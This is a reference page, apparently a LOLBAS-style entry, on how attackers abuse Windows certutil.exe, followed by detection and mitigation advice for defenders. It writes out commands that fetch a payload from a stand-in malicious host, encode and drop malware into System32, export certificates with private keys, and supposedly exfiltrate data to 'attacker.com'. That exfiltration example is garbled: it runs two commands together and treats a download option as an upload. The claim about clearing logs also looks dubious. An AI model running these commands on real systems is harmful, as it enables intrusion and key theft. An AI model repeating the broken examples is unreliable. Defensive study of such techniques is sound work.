# certutil.exe
## What is it?
*```certutil.exe``` is a **built-in Windows command-line utility** used for managing certificates and PKI (Public Key Infrastructure) operations.*  
*It allows users to **install, verify, export, import, and delete certificates**, making it a crucial tool for system administrators.*  

*Because it is a **trusted Microsoft binary**, attackers can **abuse it** for **data exfiltration, malware delivery, persistence, and credential theft** while bypassing security controls.*

## Legitimate Usage
- **Manage Certificates** → Install, delete, and validate certificates.
- **Retrieve CA Information** → Query and configure Certificate Authorities.
- **Convert Certificate Formats** → Encode and decode certificates (Base64, DER).
- **Check Revocation Lists (CRLs)** → Verify certificate validity.
- **Back up and Restore Certificates** → Export/import certificates for system recovery.

## How to abuse it
- **Download & Execute Malware** → Fetch payloads from the internet via ```certutil.exe -urlcache -f```.
- **Obfuscate & Encode Data** → Hide malicious code using Base64 encoding.
- **Exfiltrate Sensitive Data** → Convert files into Base64 and exfiltrate them via HTTP.
- **Bypass Security Controls** → Use a **trusted binary** (LOLBas) to evade detection.
- **Credential Dumping** → Extract certificates that store private keys for authentication.
- **Remove Security Logs** → Modify or delete certificates used for logging and security enforcement.

## Example Attacks
### 1. Download & Execute Malware
*Attackers use ```certutil.exe``` to download malicious payloads from the internet.*

```
certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe
```

**Effect:**
- Downloads ```payload.exe``` from ```http://malicious.com```.
- **Bypasses security tools** that block common downloader scripts.

### 2. Obfuscate and Encode Malware (Base64)
*Attackers encode malware using Base64 to evade detection.*
**Encode File in Base64**

```
certutil -encode malware.exe encoded.txt
```

**Decode Base64 File**

certutil -decode encoded.txt decoded.exe

**Effect:**
- Hides malware as a harmless Base64 text file.
- Prevents detection by antivirus tools that scan executables.

### 3. Data Exfiltration via Base64 Encoding
*Attackers steal sensitive data by encoding it into Base64 and sending it over HTTP.*

```
certutil -encode C:\SensitiveData.txt encodedData.txt certutil -urlcache -split -f http://attacker.com/upload encodedData.txt
```

**Effect:**
- Converts **stolen data** into an **innocent-looking text file**.
- Uploads the encoded data to an **attacker-controlled server**.

### 4. Bypassing Application Whitelisting
*Security policies often allow certutil.exe to run since it is a trusted Microsoft binary.*
**Copy Malware to a Trusted Location**

```
certutil -decode malware.b64 C:\Windows\System32\trusted.exe
```

**Effect:**
- Drops malware into a **whitelisted directory**, bypassing security restrictions.

### 5. Credential Theft (Exporting Certificates with Private Keys)
*Attackers extract certificate-based authentication credentials to impersonate users.*

```
certutil -exportPFX MY stolen.pfx
```

**Effect:**
- Exports **authentication certificates** with **private keys**, enabling **pass-the-cert attacks**.

### 6. Clearing Security Logs (Tampering with Certificates)
*Attackers modify or delete security-related certificates to disrupt monitoring.*

```
certutil -delstore MY "SecurityLogCert"
```

**Effect:**
- Removes **logging certificates**, disrupting **security monitoring**.

## Detection & Mitigation
### Detection Methods
**Monitor Network-Based Abuse**
- **Detect unauthorized internet access using certutil.exe** (e.g., downloading payloads).
- **Event ID 4688 (Process Creation)** → Look for suspicious command-line usage.

**Check for Unexpected Certificate Activity**
- **Event ID 4886 & 4887 (Certificate Issuance/Denial)** → Monitor unusual certificate requests.
- **Event ID 4769 (Kerberos Authentication Ticket Request)** → Look for pass-the-cert attacks.

**Detect Base64 Encoding/Decoding**
- **Look for encoded files in ```C:\Users\Public\``` or temp folders.**
- **Monitor commands with ```certutil -encode``` or ```certutil -decode``` in logs.**

### Mitigation Strategies
- **Restrict Internet Access for certutil.exe** → Block outgoing network requests.
- **Use Application Control (AppLocker, WDAC)** → Prevent abuse of ```certutil.exe```.
- **Limit Certificate Export Permissions** → Restrict access to **private keys**.
- **Monitor File & Process Activity** → Track unusual Base64 encoding/decoding.
